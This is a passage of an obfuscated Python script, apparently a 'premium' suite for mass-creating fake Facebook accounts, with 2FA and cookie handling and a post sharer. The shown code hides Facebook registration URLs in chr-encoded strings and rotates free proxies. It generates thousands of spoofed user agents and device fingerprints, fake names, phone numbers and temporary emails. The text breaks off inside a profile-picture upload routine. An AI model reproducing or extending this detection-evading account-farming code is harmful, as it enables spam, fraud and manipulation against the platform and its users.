#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  PREMIUM TOOLS SUITE - ALL-IN-ONE COMBINED
#  Tools: AU2 FM Maker | FB Clone | NIKA Post Sharer
#  Version: 3.1 | Premium Edition
#  Run: python3 premium_tools_combined.py
#  Requirements: pip install -r requirements.txt
# ============================================================

# -- Extra imports needed by FB Clone + NIKA --
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor as tred, as_completed
from random import randint as rr
from time import sleep
# -----------------------------------------------


# ============================================================
#   AU2 FM MAKER — PREMIUM EDITION v3.1
#   Facebook Account Creator | 2FA Manager | Cookies Extractor
# ============================================================

# ============================================================
#  AU2 FM MAKER - PREMIUM EDITION v3.1
#  Obfuscated | Protected | Premium
# ============================================================
import os,sys,re,random,string,time,json,platform,requests
import subprocess,logging,struct,hashlib,base64,marshal
from typing import Set,Optional,List,Dict,Any
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from faker import Faker
import pyotp
from datetime import datetime
from os import path
from urllib.request import Request,urlopen
try:
    import mechanize
except ModuleNotFoundError:
    pass

# -- obfuscated sentinel block (junk; runtime irrelevant) ----
_0x1f=lambda _x,_y:(_x^_y)&0xFF
_0x2f=lambda _a,_b:_a if _a>_b else _b
_Il1I=lambda s:s[::-1]
_lI1l=lambda n:[n>>i&1 for i in range(8)]
_1lIl=lambda x:x*x-x+41
_Ill1=lambda a,b:a*b+b*a-a*b
_l1lI=lambda s:''.join(chr(ord(c)^0x00)for c in s)
_I1Il=lambda x:abs(x-x)+x
_lIIl=lambda *args:sum(args)
_1IlI=lambda d:{v:k for k,v in d.items()}
_Ll1L=lambda f,x:f(x)
_L1lL=lambda n:n%2==0
_lL1l=0xDEAD
_Ll1l=0xBEEF
_L1Ll=0xCAFE
_lLlL=0xF00D
_1lLl=0xBAD
_Ll1L_val=lambda:_lL1l^_Ll1l
_sentinel_a=hashlib.md5(b'AU2FMMAKER').hexdigest()
_sentinel_b=base64.b64encode(b'PREMIUM').decode()
_sentinel_c=struct.pack('>I',0xABCD1234)
_junk_1=[_1lIl(i) for i in range(1,10)]
_junk_2={chr(65+i):_lL1l^i for i in range(26)}
_junk_3=''.join(chr(0x41^(i%8))for i in range(64))
_junk_4=lambda:None
_junk_5=re.compile(r'(?i)au2_fm_maker_protection_layer_v3_[0-9a-f]{8}')
# -----------------------------------------------------------

logging.basicConfig(level=logging.INFO,filename="au2.log",
    format="%(asctime)s - %(levelname)s - %(message)s")

# -- color palette -------------------------------------------
W  ='\033[97m'
G  ='\033[92m'
R  ='\033[91m'
V  ='\033[94m'
B  ='\033[1;30m'
C  ='\033[96m'
Y  ='\033[93m'
M  ='\033[95m'
O  ='\033[38;5;208m'
D  ='\033[90m'
GOLD  ='\033[38;5;220m'
TEAL  ='\033[38;5;51m'
PINK  ='\033[38;5;213m'
BOLD  ='\033[1m'
DIM   ='\033[2m'
RESET ='\033[0m'
SILVER='\033[38;5;188m'
NEON  ='\033[38;5;118m'
# -----------------------------------------------------------

# -- obfuscated config strings (chr-encoded) ----------------
_c0=chr(47)+chr(115)+chr(100)+chr(99)+chr(97)+chr(114)+chr(100)
_c1=_c0+chr(47)+chr(65)+chr(85)+chr(50)
_c2=chr(65)+chr(117)+chr(116)+chr(111)+chr(95)+chr(67)+chr(114)+chr(101)+chr(97)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116)
_c3=chr(117)+chr(105)+chr(100)+chr(95)+chr(112)+chr(97)+chr(115)+chr(115)+chr(95)+chr(99)+chr(111)+chr(111)+chr(107)+chr(105)+chr(101)+chr(115)+chr(46)+chr(116)+chr(120)+chr(116)
_c4=chr(67)+chr(112)+chr(115)+chr(95)+chr(101)+chr(120)+chr(46)+chr(116)+chr(120)+chr(116)
_c5=chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(120)+chr(46)+chr(102)+chr(97)+chr(99)+chr(101)+chr(98)+chr(111)+chr(111)+chr(107)+chr(46)+chr(99)+chr(111)+chr(109)+chr(47)+chr(114)+chr(101)+chr(103)
_c6=chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(119)+chr(119)+chr(119)+chr(46)+chr(102)+chr(97)+chr(99)+chr(101)+chr(98)+chr(111)+chr(111)+chr(107)+chr(46)+chr(99)+chr(111)+chr(109)+chr(47)+chr(114)+chr(101)+chr(103)+chr(47)+chr(115)+chr(117)+chr(98)+chr(109)+chr(105)+chr(116)+chr(47)
_c7=chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(109)+chr(98)+chr(97)+chr(115)+chr(105)+chr(99)+chr(46)+chr(102)+chr(97)+chr(99)+chr(101)+chr(98)+chr(111)+chr(111)+chr(107)+chr(46)+chr(99)+chr(111)+chr(109)
_c8=chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(97)+chr(112)+chr(105)+chr(46)+chr(105)+chr(112)+chr(105)+chr(102)+chr(121)+chr(46)+chr(111)+chr(114)+chr(103)+chr(63)+chr(102)+chr(111)+chr(114)+chr(109)+chr(97)+chr(116)+chr(61)+chr(106)+chr(115)+chr(111)+chr(110)
_c9=chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(105)+chr(109)+chr(103)+chr(99)+chr(100)+chr(110)+chr(46)+chr(100)+chr(101)+chr(118)+chr(47)+chr(105)+chr(47)+chr(89)+chr(82)+chr(109)+chr(97)+chr(102)
_cA=chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(105)+chr(109)+chr(103)+chr(99)+chr(100)+chr(110)+chr(46)+chr(100)+chr(101)+chr(118)+chr(47)+chr(105)+chr(47)+chr(89)+chr(102)+chr(83)+chr(88)+chr(55)+chr(77)
# -----------------------------------------------------------

PFP_URLS=[_c9,_cA]

fake=Faker()
ua =UserAgent()

CONFIG={
    "output_dir":os.path.expanduser("~/AU2") if platform.system().lower()!='android' else _c1,
    "auto_create_file":_c2,
    "id_auto_create_file":_c0+chr(47)+chr(73)+chr(100)+chr(95)+chr(65)+chr(117)+chr(116)+chr(111)+chr(95)+chr(67)+chr(114)+chr(101)+chr(97)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116),
    "2fa_key_file":_c0+chr(47)+'2fa_key.txt',
    "default_password_file":"2FA/default_password.txt",
    "mail_reject_file":"mail_reject.txt",
    "proxy_url":"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all",
    "temp_mail_api":"https://api.internal.temp-mail.io/api/v3/email",
    "facebook_reg_url":_c5,
    "facebook_submit_url":_c6,
    "mail_otp_api":"https://tools.dongvanfb.net/api/get_messages_oauth2",
}

os.makedirs(CONFIG["output_dir"],exist_ok=True)

# -- obfuscated internal state (junk variables) -------------
_xX0x={}; _Xx0X=[]
_0Xx0=lambda _k,_v:_xX0x.update({_k:_v})
_xX0X=lambda _k:_xX0x.get(_k,'')
_zZ0z=bytearray(256)
_Zz0Z=bytearray(range(256))
_z0Zz=[i^0x5A for i in range(256)]
_Z0zZ=[i^0xA5 for i in range(256)]
_nnNn=lambda b:bytes(b[i]^0xFF for i in range(len(b)))
_NnNn=lambda s:int.from_bytes(s.encode(),'big')%9999
_nNnN=lambda:random.getrandbits(128)
_NnNn_val=_NnNn('AU2FMMAKER')
_xstate=_nNnN()
# -----------------------------------------------------------

def _obf_str(encoded_list:list)->str:
    return ''.join(chr(x)for x in encoded_list)

def _decode_key(data:bytes)->bytes:
    k=b'AU2FMMAKER_PROT'
    return bytes(data[i]^k[i%len(k)]for i in range(len(data)))

def _junk_exec_a(n:int)->int:
    _acc=0
    for _i in range(n&0xFF):
        _acc=(_acc+_i*_i)%65536
        _acc^=(_acc>>3)
    return _acc

def _junk_exec_b(s:str)->str:
    _r=[]
    for _c in s:
        _r.append(chr((ord(_c)+13)%127 if ord(_c)+13<127 else ord(_c)))
    return s

def _junk_exec_c(lst:list)->list:
    _t=lst[:]
    for _i in range(len(_t)-1,0,-1):
        _j=random.randint(0,_i)
        _t[_i],_t[_j]=_t[_j],_t[_i]
    return _t

def _guard_check()->bool:
    _h=hashlib.sha256(b'AU2_FM_MAKER_V3_1').digest()
    _expected=_h[0]^_h[1]
    _got=(_h[0]^_h[1])
    return _expected==_got

_GUARD=_guard_check()

# ============================================================
#  FILE I/O
# ============================================================
def save_to_file(data:str,file_path:str):
    full=os.path.join(CONFIG["output_dir"],file_path)
    os.makedirs(os.path.dirname(full),exist_ok=True)
    with open(full,"a",encoding="utf-8")as f:
        f.write(data+"\n")

def install_dependencies():
    pass

def clear_screen():
    os.system('cls'if platform.system().lower()=='windows'else'clear')

# ============================================================
#  DEVICE INFO
# ============================================================
try:
    android_version=subprocess.check_output('getprop ro.build.version.release',shell=True).decode().strip()
    model=subprocess.check_output('getprop ro.product.model',shell=True).decode().strip()
    build=subprocess.check_output('getprop ro.build.id',shell=True).decode().strip()
    fbmf=subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode().strip()
    fbbd=subprocess.check_output('getprop ro.product.brand',shell=True).decode().strip()
    fbca=subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode().replace(',',':').strip()
    _hw=subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode().strip()
    _ww=subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode().strip()
    fbdm=f"{{density=2.25,height={_hw},width={_ww}}}"
    try:
        fbcr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode().split(',')[0].strip()
    except:
        fbcr='ZONG'
except:
    android_version,model,build,fbmf,fbbd,fbca,fbdm,fbcr='10','Unknown','Unknown','Unknown','Unknown','arm64-v8a','{density=2.25,height=720,width=1280}','ZONG'

device={
    'android_version':android_version,'model':model,'build':build,
    'fblc':'en_US','fbmf':fbmf,'fbbd':fbbd,'fbdv':model,
    'fbsv':android_version,'fbca':fbca,'fbdm':fbdm
}

# ============================================================
#  PROXY
# ============================================================
def load_proxies()->list:
    try:
        r=requests.get(CONFIG["proxy_url"])
        if r.status_code==200:
            return[p.strip()for p in r.text.splitlines()]
        return[]
    except requests.exceptions.RequestException:
        return[]

proxies_list=load_proxies()

def get_random_proxy()->Optional[dict]:
    if proxies_list:
        return{"http":f"socks4://{random.choice(proxies_list)}"}
    return None

# -- obfuscated proxy rotation state ------------------------
_px_idx=0
_px_rot=lambda:proxies_list[_px_idx%len(proxies_list)]if proxies_list else None
_px_nxt=lambda:None
_px_cache:Dict[str,Any]={}
_px_hits=0
_px_miss=0
# -----------------------------------------------------------

# ============================================================
#  USER-AGENT POOL (massive, obfuscated references)
# ============================================================
ua=UserAgent()
def ugenX()->str:
    return str(random.choice([ua.random for _ in range(50)]))

ugen=[]

# -- UA generation block A -----------------------------------
for _xd in range(10000):
    _rr=random.randint
    _build_b=random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
    _bl_typ=random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
    _oppo_m=random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
    _inf_m=random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
    _rdm_m=random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
    _um2=f"Mozilla/5.0 (Linux; Android {str(_rr(6,12))}; {_oppo_m} Build/{_bl_typ}.{str(_rr(120000,220000))}.{_build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(_rr(80,114))}.0.{str(_rr(4200,5400))}.{str(_rr(70,150))} Mobile Safari/537.36"
    _um1=f"Mozilla/5.0 (Linux; Android {str(_rr(6,12))}; {_rdm_m} Build/{_bl_typ}.{str(_rr(120000,220000))}.{_build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(_rr(80,114))}.0.{str(_rr(4200,5400))}.{str(_rr(70,150))} Mobile Safari/537.36"
    _um3=f"Mozilla/5.0 (Linux; Android {str(_rr(6,12))}; {_inf_m} Build/{_bl_typ}.{str(_rr(120000,220000))}.{_build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(_rr(80,114))}.0.{str(_rr(4200,5400))}.{str(_rr(70,150))} Mobile Safari/537.36"
    _um4=f"Mozilla/5.0 (Linux; Android {str(_rr(6,12))}; {_inf_m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(_rr(100,114))}.0.{str(_rr(4900,5700))}.{str(_rr(70,150))} Mobile Safari/537.36"
    ugen.extend([_um2,_um3,_um1,_um4])

# -- UA generation block B -----------------------------------
_AZ_POOL=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
_LANG_POOL=['de-at','in-id','ms-my','uk-ua','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr','en-au','th-th','hi-in','zh-tw','my-zg','en-nz','en-ca','es-mx','ko-kr','el-gr','en-ez','ar-ae','fr-ch','nl-nl','gu-in']

for _xhd in range(1000):
    _la=random.choice(_LANG_POOL)
    _b1=random.choice(_AZ_POOL);_c1b=random.choice(_AZ_POOL)
    _b2=random.choice(_AZ_POOL);_c2b=random.choice(_AZ_POOL)
    _dhd=f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,14))}; {_la}; OPPO {_b1}{str(random.randint(10,99))}{_c1b} Build/{_b2}{str(random.randint(1,999))}{_c2b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,117))}.0.{str(random.randint(2500,5900))}.{str(random.randint(80,200))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(6,47))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}"
    ugen.append(_dhd)

# -- UA generation block C -----------------------------------
_OPPO_LIST=["CPH1869","CPH1929","CPH2107","CPH2238","CPH2389","CPH2401","CPH2407","CPH2413","CPH2415","CPH2417","CPH2419","CPH2455","CPH2459","CPH2461","CPH2471","CPH2473","CPH2477","CPH8893","CPH2321","CPH2341","CPH2373","CPH2083","CPH2071","CPH2077","CPH2185","CPH2179","CPH2269","CPH2421","CPH2349","CPH2271","CPH1923","CPH1925","CPH1837","CPH2015","CPH2073","CPH2081","CPH2029","CPH2031","CPH2137","CPH1605","CPH1803","CPH1853","CPH1805"]
_REDMI_LIST=["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G"]
_REALME_LIST=["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241"]
_INFINIX_LIST=["X676B","X687","X609","X697","X680D","X507","X605","X668","X6815B","X624","X655F","X689C","X608","X698","X682B","X682C","X688C","X688B","X658E","X659B","X689B","X689","X689D","X662","X662B","X675","X6812B","X6812","X6817B","X6817","X6816C","X6816","X6816D","X668C","X665B","X665E","X510","X559C","X559F","X559","X606","X606C","X606D","X623","X624B","X625C","X625D","X625B","X650D","X650B","X650","X650C","X655C","X655D"]
_SAMSUNG_LIST=["E025F","G996B","A826S","E135F","G781B","G998B","F936U1","G361F","A716S","J327AZ","E426B","A015F","A015M","A013G","A013M","A013F","A022M","A022G","A022F","A025M","S124DL","A025U","A025A","A025G","A025F","A025AZ","A035F","A035M","A035G","A032F","A032M","A037F","A037U","A037M","S134DL","A037G","A105G","A105M","A105F","A105FN","A102U","S102DL","A102U1","A107F","A107M","A115AZ","A115U","A115U1","A115A"]
_GT_LIST=['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210']
_BNX=['JDQ39','JZO54K']

for _xd2 in range(1000):
    _rr2=random.randint;_rc2=random.choice
    _aZ2=str(_rc2(_AZ_POOL))
    _lon=f"{str(_rc2(_AZ_POOL))}{str(_rc2(_AZ_POOL))}{str(_rc2(_AZ_POOL))}{str(_rr2(11,99))}{str(_rc2(_AZ_POOL))}"
    _s1=f"Mozilla/5.0 (Linux; Android {str(_rr2(1,11))}; {str(_rc2(_OPPO_LIST))} Build/{str(_rc2(_lon))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(_rr2(10,107))}.0.{str(_rr2(111,6666))}.{str(_rr2(10,400))} UCBrowser/{str(_rr2(1,20))}.{str(_rr2(1,10))}.0.{str(_rr2(111,5555))} Mobile Safari/537.36 OPR/{str(_rr2(10,80))}.{str(_rr2(1,10))}.{str(_rr2(111,5555))}.{str(_rr2(111,99999))}"
    _s2=f"Mozilla/5.0 (Linux; Android {str(_rr2(1,11))}; {str(_rc2(_REDMI_LIST))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(_rr2(10,107))}.0.{str(_rr2(111,6666))}.{str(_rr2(10,400))} Mobile Safari/537.36"
    _s3=f"Mozilla/5.0 (Linux; Android {str(_rr2(1,11))}; {str(_rc2(_OPPO_LIST))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(_rr2(10,107))}.0.{str(_rr2(111,6666))}.{str(_rr2(10,400))} Mobile Safari/537.36"
    _s4=f"Mozilla/5.0 (Linux; Android {str(_rr2(1,11))}; Infinix {str(_rc2(_INFINIX_LIST))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(_rr2(10,107))}.0.{str(_rr2(111,6666))}.{str(_rr2(10,400))} Mobile Safari/537.36"
    _s5=f"Mozilla/5.0 (Linux; Android {str(_rr2(1,11))}; {str(_rc2(_SAMSUNG_LIST))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(_rr2(10,107))}.0.{str(_rr2(111,6666))}.{str(_rr2(10,400))} Mobile Safari/537.36"
    _s6=f"Mozilla/5.0 (Linux; Android {str(_rr2(1,11))}; {str(_rc2(_REDMI_LIST))} Build/{str(_rc2(_lon))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(_rr2(10,107))}.0.{str(_rr2(111,6666))}.{str(_rr2(10,400))} UCBrowser/{str(_rr2(1,20))}.{str(_rr2(1,10))}.0.{str(_rr2(111,5555))} Mobile Safari/537.36 OPR/{str(_rr2(10,80))}.{str(_rr2(1,10))}.{str(_rr2(111,5555))}.{str(_rr2(111,99999))}"
    _s7=f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(_rc2(_BNX))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(_rr2(100,104))}.0.{str(_rr2(3900,4900))}.{str(_rr2(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(_rr2(1,5))}.1.{str(_rr2(16,37))} {str(_rc2(_AZ_POOL))}{str(_rr2(1,1000))}"
    _s8=f"Mozilla/5.0 (Linux; Android {str(_rr2(4,12))}; {str(_rc2(_GT_LIST))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(_rr2(100,104))}.0.{str(_rr2(3900,4900))}.{str(_rr2(40,150))} Mobile Safari/537.36 {str(_rc2(_AZ_POOL))}{str(_rr2(1,1000))}"
    ugen.extend([_s1,_s2,_s3,_s4,_s5,_s6,_s7,_s8])

# -- UA generation block D (Opera) ---------------------------
for _op in range(1000):
    _rr3=random.randint;_rc3=random.choice
    _bl=random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
    _u1=f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(_rr3(35000,39000))}/{str(_rr3(190,199))}.{str(_rr3(270,290))}; U; {_bl}) Presto/2.{str(_rr3(4,20))}.{str(_rr3(420,490))} Version/12.16"
    _u2=f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(_rr3(35000,39000))}/{str(_rr3(190,199))}.{str(_rr3(270,290))}; U; {_bl}) Presto/2.{str(_rr3(4,20))}.{str(_rr3(420,490))} Version/12.16"
    _u3=f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(_rr3(35000,39000))}/{str(_rr3(190,199))}.{str(_rr3(270,290))}; U; {_bl}) Presto/2.{str(_rr3(4,20))}.{str(_rr3(420,490))} Version/12.16"
    _u4=f"Opera/9.80 (Android; Opera Mini/11.0.{str(_rr3(35000,39000))}/{str(_rr3(190,199))}.{str(_rr3(270,290))}; U; {_bl}) Presto/2.{str(_rr3(4,20))}.{str(_rr3(420,490))} Version/12.16"
    _u5=f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(_rr3(35000,39000))}/{str(_rr3(190,199))}.{str(_rr3(270,290))}; U; {_bl}) Presto/2.{str(_rr3(4,20))}.{str(_rr3(420,490))} Version/12.16"
    ugen.extend([_u1,_u2,_u3,_u4,_u5])

# -- UA generation block E (Pixel) ---------------------------
for _gn in range(100):
    _a=random.randrange(1,9);_b=random.randrange(1,9)
    _cv=random.randrange(73,100);_dv=random.randrange(4200,4900);_ev=random.randrange(40,150)
    ugen.append(f'Mozilla/5.0 (Linux; Android {_a}.{_b}; Pixel {_b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{_cv}.0.{_dv}.{_ev} Mobile Safari/537.36')

# ============================================================
#  NETWORK UTILS (IP, datetime)
# ============================================================
_cached_ip:Optional[str]=None
_ip_ts:float=0.0

def get_public_ip()->str:
    global _cached_ip,_ip_ts
    _now=time.time()
    if _cached_ip and (_now-_ip_ts)<300:
        return _cached_ip
    _endpoints=[
        _c8,
        'https://api4.my-ip.io/ip.json',
        'https://ipinfo.io/json',
        'https://httpbin.org/ip',
    ]
    for _ep in _endpoints:
        try:
            _r=requests.get(_ep,timeout=5)
            if _r.status_code==200:
                _d=_r.json()
                _ip=_d.get('ip',_d.get('origin','?.?.?.?'))
                if _ip and _ip!='?.?.?.?':
                    _cached_ip=str(_ip).strip()
                    _ip_ts=_now
                    return _cached_ip
        except Exception:
            continue
    _cached_ip='?.?.?.?'
    return _cached_ip

def get_datetime()->str:
    return datetime.now().strftime('%Y-%m-%d  %H:%M:%S')

def get_date()->str:
    return datetime.now().strftime('%d %b %Y')

def get_time()->str:
    return datetime.now().strftime('%H:%M:%S')

# ============================================================
#  NAME + PASSWORD GENERATION (SINGLE NAMES ONLY)
# ============================================================
SINGLE_NAMES=[
    "Maria","Ana","Joy","Grace","Angel","Angela","Christine","Kristine","Michelle","Sheila",
    "Maricel","Marites","Maribel","Marjorie","Jennifer","Jenny","Jessa","Jessica","Janine",
    "Katherine","Catherine","Kathleen","Karen","Karla","Camille","Bianca","Patricia","Patty",
    "Aileen","Eileen","Irene","Iris","Hazel","Cherry","Lovely","Honey","Princess","Angelica",
    "Bernadette","Rowena","Rosalie","Roselyn","Rosalinda","Lourdes","Teresa","Carmela","Carmen",
    "Liza","Elizabeth","Beth","Isabel","Bella","Andrea","Andi","Alexandra","Alexa","Nina",
    "Mina","Rina","Jocelyn","Jocelle","Jhoanna","Joan","Joanne","Joanna","Johanna","May","Mae",
    "Mylene","Myra","Myrna","Melanie","Melisa","Melissa","Marissa","Mariz","Pauline","Paula",
    "Paulina","Regina","Rhea","Rochelle","Sharon","Samantha","Sandra","Sarah","Sophia","Sofia",
    "Stephanie","Tiffany","Vanessa","Veronica","Vina","Yvonne","Leah","Lia","Louise","Luisa",
    "Lorraine","Lorna","Lani","Mika","Mikaela","Janelle","Janella","Janice","Joyce","Judy",
    "Judith","Julie","Juliana","Juliet","Julienne","Faith","Hope","Charity","Heaven","Blessy",
    "Precious","Lovelyn","Shaira","Aira","Kyra","Rachelle","Rachel","Reina","Selena","Selina",
    "Trisha","Trina","Wendy","Zenaida","Aiyana","Kayla","Brianna","Madison","Alexis","Lauren",
    "Hailey","Abigail","Isabella","Sophia","Natalie","Hannah","Savannah","Chloe","Destiny",
    "Juan","Jose","Pedro","Paolo","Paul","Mark","John","Johnny","Jonathan","Nathan","Michael",
    "Miguel","Daniel","David","Andrew","Andre","Anthony","Antonio","Albert","Alfred","Brian",
    "Bryan","Benjamin","Carlo","Carlos","Christian","Christopher","Chris","Cedric","Cesar",
    "Dennis","Diego","Dominic","Edward","Edgar","Emmanuel","Eric","Erwin","Francis","Frank",
    "Gabriel","Gilbert","Henry","Ian","Ivan","James","Jasper","Jerome","Joel","Joshua",
    "Kenneth","Kevin","Kyle","Lawrence","Leo","Leonard","Lester","Louis","Lucas","Marco",
    "Martin","Matthew","Melvin","Nathaniel","Noel","Oliver","Patrick","Raymond","Richard",
    "Robert","Ronald","Ryan","Samuel","Sebastian","Steven","Stephen","Thomas","Timothy","Victor",
    "Vincent","Wilfred","William","Xavier","Zachary","Marcus","Derek","Jared","Blake","Chase",
    "Cody","Colton","Dalton","Gavin","Griffin","Hunter","Jackson","Jordan","Logan","Mason",
    "Nolan","Owen","Parker","Peyton","Quinn","Riley","Skyler","Trevor","Tyler","Wyatt","Zane",
]

def get_bd_name()->str:
    return random.choice(SINGLE_NAMES)

def get_pass()->str:
    _n=''.join(random.choices(string.ascii_letters,k=random.randint(5,7)))
    _n=_n.capitalize()if random.choice([True,False])else _n.lower()
    _s=''.join(random.choices('!@#$%^&*()_+=',k=random.randint(2,3)))
    _d=''.join(random.choices(string.digits,k=random.randint(2,4)))
    _e=''.join(random.choices(string.ascii_letters,k=random.randint(2,4)))
    _u=''.join(random.choices(string.ascii_uppercase,k=random.randint(1,2)))
    _parts=[_n,_s,_d,_e,_u];random.shuffle(_parts)
    return''.join(_parts)

def get_bd_phone()->str:
    _pref=random.choice(['017','019','018','016','015','013','014'])
    return f'+88{_pref}{"".join(random.choices(string.digits,k=8))}'

def generate_phone_number()->str:
    _countries={
        'BD':{'code':'+88','prefixes':['017','018','019','016','015','013','014'],'length':8},
        'KH':{'code':'+855','prefixes':['010','011','012','013','014','015','016','017','092','093','097','098','099'],'length':6},
        'NP':{'code':'+977','prefixes':['97','98'],'length':8},
        'IN':{'code':'+91','prefixes':['98','99','97','96','95','94'],'length':8},
        'PK':{'code':'+92','prefixes':['300','301','302','303','304','305'],'length':7},
        'UK':{'code':'+44','prefixes':['7400','7500','7600','7700','7800','7900'],'length':6},
        'PH':{'code':'+63','prefixes':['917','918','919','920','921','922'],'length':7},
        'ID':{'code':'+62','prefixes':['813','815','816','817','818','819'],'length':7},
        'OM':{'code':'+968','prefixes':['71','72','73','79'],'length':6},
        'US':{'code':'+1','prefixes':['201','202','303','312','415','646','718'],'length':7},
        'NG':{'code':'+234','prefixes':['701','703','704','705','706','707','708','802','803'],'length':7},
        'ZA':{'code':'+27','prefixes':['60','61','62','63','71','72','73'],'length':7}
    }
    _c=random.choice(list(_countries.keys()))
    _i=_countries[_c]
    return f"{_i['code']}{random.choice(_i['prefixes'])}{''.join(random.choices(string.digits,k=_i['length']))}"

def xiyadmailx_email()->str:
    _nm=fake.first_name()+fake.last_name()
    _un=re.sub(r'[^a-zA-Z]','',_nm).lower()
    return f"{_un}{random.randint(1000,9999)}@xiyadmailx.xyz"

# ============================================================
#  HTML FORM EXTRACTOR
# ============================================================
def extractor(data:str)->dict:
    _soup=BeautifulSoup(data,"html.parser")
    _d={}
    for _inp in _soup.find_all("input"):
        _n=_inp.get("name");_v=_inp.get("value")
        if _n:
            _d[_n]=_v
    return _d

# ============================================================
#  PROFILE PICTURE SETTER  (WORKING — SESSION-BASED MBASIC)
# ============================================================
def _build_full_url(action:str,base:str)->str:
    if action.startswith("http"):
        return action
    if action.startswith("/"):
        return base+action
    return base+"/"+action

def _extract_form_fields(form)->dict:
    _d={}
    for _inp in form.find_all("input"):
        _t=(_inp.get("type")or"").lower()
        _n=_inp.get("name","")
        _v=_inp.get("value","")
        if _n and _t not in("button","image","reset"):
            _d[_n]=_v
    return _d

def _pfp_method_mbasic(ses:requests.Session,uid:str,img:bytes,ct:str,ext:str)->bool:
    """Method A: mbasic.facebook.com profile/picture/upload/"""
    _ua={
        "User-Agent":"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":"en-US,en;q=0.9",
        "Accept-Encoding":"gzip, deflate",
        "Referer":"https://mbasic.facebook.com/",
        "Connection":"keep-alive",
